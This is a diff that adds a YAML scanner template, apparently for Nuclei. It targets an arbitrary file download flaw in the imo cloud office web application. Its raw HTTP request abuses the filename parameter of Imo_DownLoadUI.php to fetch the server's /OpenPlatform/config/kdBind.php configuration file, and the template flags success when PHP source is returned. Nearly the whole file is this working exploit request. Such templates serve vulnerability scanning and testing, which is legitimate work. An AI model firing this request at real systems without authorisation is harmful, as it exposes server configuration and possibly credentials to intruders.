@@ -1,0 +1,26 @@
+id: imo-DownLoadUI-fileread
+info:
+  name: imo-DownLoadUI-fileread
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/8ef121dc255023cd80808fc5c381aa34d38e892d/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20Imo_DownLoadUI.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <?php
